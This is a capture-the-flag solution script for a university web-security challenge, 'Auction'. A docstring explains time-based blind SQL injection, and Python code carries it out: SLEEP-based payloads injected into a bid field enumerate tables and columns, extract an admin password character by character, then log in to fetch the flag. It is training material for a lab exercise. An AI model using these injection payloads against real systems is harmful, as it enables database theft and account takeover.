"""
# #2 Auction

## Type
Web Security

## Vulnerability type
SQL Injection

## Description
The salary of a PhD student is pretty low, so we decided to sell some of our stuff. 
Even though we are reluctant to part with them, on our platform you can find our most precious items and bid on them. 
Be quick in your bids, because time is crucial! Can you log in as the admin though?

## Explaination
In this challenge, the server executes a SQL query based on user input. 
However, it is vulnerable to SQL injection, allowing for the injection of custom SQL by concatenating it to the offer value in the input box. 
This vulnerability enables the insertion of nested SQL queries using additional conditions with `AND`/`OR` clauses. 
Consequently, when the query executes, the database evaluates the injected condition alongside the original query.

This attack constitutes a blind SQL injection since the server does not return query results. 
Therefore, it is necessary to use boolean operations combined with sleep commands to extract information. 
In this scenario, the injected query uses the `LIKE` command to guess each character of a table name, column name, or password. 
Visualize it as cracking a combination lock, where each guess iterates through possible characters until the correct combination is found.

The provided script already incorporates the correct password and username. 
This decision was made to expedite the process since a complete attack from scratch would require considerable time. 
However, for those wishing to conduct the attack from scratch, they can do so by uncommenting the functions responsible for retrieving tables, columns, and ultimately, the admin password.
"""

import binascii
from bs4 import BeautifulSoup
import requests
import string
from time import time
from uuid import uuid4

client = requests.Session()

url = f"http://cyberchallenge.disi.unitn.it:50050"

product_id = 1
product_url = f"{url}/{product_id}"

def string_to_hex(input_string: str):
    encoded_bytes = input_string.encode('utf-8')

    # Convert the bytes to hexadecimal representation
    hex_representation = binascii.hexlify(encoded_bytes).decode('utf-8')

    return hex_representation.upper()

def get_tables(client: requests.Session, url: str, main_table: str = "information_schema.tables", sleep_time: int = 2):

    tables = []

    table = ""

    while True:

        # Whenever a new table is discovered, append it to a list to ensure it is not encountered repeatedly
        excluded_tables = "'" + "', '".join(tables) + "'"
        excluded_tables = f"AND TABLE_NAME NOT IN ({excluded_tables})"
        
        found = False

        # Try every character
        for character in string.printable:
            
            # Here, if there is a match between the hex of a table name and the name of the table we are building, execute the sleep
            injection = f"AND (SELECT SLEEP({sleep_time}) FROM {main_table} WHERE HEX(TABLE_NAME) LIKE '{string_to_hex(table + character)}%' {excluded_tables})"

            data = {
                "offer": f"1 {injection}"
            }

            start = time()
            client.post(url=url, data=data)
            end = time()

            # Check if the sleep has been executed
            if end - start >= sleep_time:
                table = table + character
                found = True
                print(character, end="")

        if not found:

            print("")

            if len(table):
                tables.append(table)
                table = ""
            
            else:
                break

    return tables

def get_columns(client: requests.Session, url: str, table: str, main_table: str = "information_schema.columns", sleep_time: int = 2):

    columns = []

    column = ""

    while True:
        
        # Whenever a new column is discovered, append it to a list to ensure it is not encountered repeatedly
        excluded_columns = "'" + "', '".join(columns) + "'"
        excluded_columns = f"AND COLUMN_NAME NOT IN ({excluded_columns})"

        found = False

        # Try every character
        for character in string.printable:
            
            # Here, if there is a match between the hex of a column name and the name of the column we are building, execute the sleep
            injection = f"AND (SELECT SLEEP({sleep_time}) FROM {main_table} WHERE TABLE_NAME='{table}' AND HEX(COLUMN_NAME) LIKE '{string_to_hex(column + character)}%' {excluded_columns})"

            data = {
                "offer": f"1 {injection}"
            }

            start = time()
            client.post(url=url, data=data)
            end = time()

            # Check if the sleep has been executed
            if end - start >= sleep_time:
                column = column + character
                found = True
                print(character, end="")

        if not found:

            print("")

            if len(column):
                columns.append(column)
                column = ""
            
            else:
                break
    
    return columns

def get_password(client: requests.Session, url: str, table: str, username: str = "admin", column: str = "password", sleep_time: int = 2):

    password = ""

    while True:
        
        found = False

        # Try every character
        for character in string.printable:
            
            # Here, if there is a match between the hex of the password and the passwrdo we are building, execute the sleep
            injection = f"AND (SELECT SLEEP({sleep_time}) FROM {table} WHERE username='{username}' AND HEX({column}) LIKE '{string_to_hex(password + character)}%')"

            data = {
                "offer": f"1 {injection}"
            }

            start = time()
            client.post(url=url, data=data)
            end = time()

            # Check if the sleep has been executed
            if end - start >= sleep_time:
                password = password + character
                found = True
                print(character, end="")

        if not found:
            break

    return password

def login(client: requests.Session, url: str, username: str = None, password: str = None):

    if any(item is None for item in [username, password]):
        
        # Random username and password
        username = str(uuid4()).replace("-","")
        password = username

        # Register
        data = {
            "username": username,
            "password": password,
            "confirm-password": password
        }

        response = client.post(url=f"{url}/register", data=data)
        soup = BeautifulSoup(response.content, "html.parser")

        error = soup.find("div", {"class": "flash-message error"}) is not None
        
        if error:
            return login(client=client, url=url, username=username, password=password)

    # Login
    data = {
        "username": username,
        "password": password,
    }

    response = client.post(url=f"{url}/login", data=data)
    soup = BeautifulSoup(response.content, "html.parser")
    
    error = soup.find("div", {"class": "flash-message success"}) is None
    
    assert not error, "Unknown error :("
    
    return client

def get_flag(url: str, password: str, username: str = "admin"):

    client = requests.Session()
    client = login(client=client, url=url, username=username, password=password)

    response = client.get(url=url)
    soup = BeautifulSoup(response.content, "html.parser")

    return soup.find("h3").text

if __name__ == "__main__":

    client = login(client=client, url=url)

    #tables = get_tables(client=client, url=product_url) # [..., user, ...]
    #columns = get_columns(client=client, url=product_url, table="user") # ["id", "username", "password"]
    #password = get_password(client=client, url=product_url, table="user") # rx4FnLg$Rh

    flag = get_flag(url=url, password="rx4FnLg$Rh")
    print(flag)
